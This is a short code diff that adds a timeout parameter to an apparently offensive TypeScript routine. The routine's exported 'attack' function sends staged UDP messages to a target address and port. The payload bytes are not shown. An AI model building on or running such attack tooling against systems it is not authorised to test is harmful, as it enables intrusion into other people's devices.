@@ -26,7 +26,7 @@ function sendMessage(socket: any, message: number[]): Promise<any> {
 	});
 }
 
-function waitForReply(socket: any, intervalMessage: number[]): Promise<boolean> {
+function waitForReply(socket: any, timeout: number, intervalMessage: number[]): Promise<boolean> {
 	const intv = setInterval(sendMessage, 500, socket, intervalMessage);
 	return new Promise(done => {
 		socket.once("message", (msg: Buffer, rinfo: any) => {
@@ -38,11 +38,11 @@ function waitForReply(socket: any, intervalMessage: number[]): Promise<boolean> 
 		setTimeout(() => {
 			clearInterval(intv);
 			done(false);
-		}, 10000);
+		}, timeout);
 	});
 }
 
-export async function attack(address: string, port: number): Promise<string> {
+export async function attack(address: string, port: number, timeout: number): Promise<string> {
 	const socket = dgram.createSocket("udp4");
 	let err;
 	err = await new Promise(done => {
@@ -56,7 +56,7 @@ export async function attack(address: string, port: number): Promise<string> {
 		return `Failed to send stage 1: ${err.toString()}`;
 	}
 	//console.log("Waiting for reply...");
-	if (!await waitForReply(socket, messageStage1)) {
+	if (!await waitForReply(socket, timeout, messageStage1)) {
 		return `Empty reply.`;
 	}
 	err = await sendMessage(socket, messageStage2);
